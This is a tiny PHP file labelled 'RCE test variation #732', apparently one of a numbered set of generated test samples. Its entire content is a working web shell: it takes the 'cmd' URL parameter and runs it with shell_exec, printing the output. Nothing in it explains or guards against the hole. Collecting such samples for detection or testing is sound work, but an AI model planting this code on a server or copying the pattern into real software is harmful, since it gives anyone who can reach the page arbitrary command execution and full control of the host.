<?php
// RCE test variation #732
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>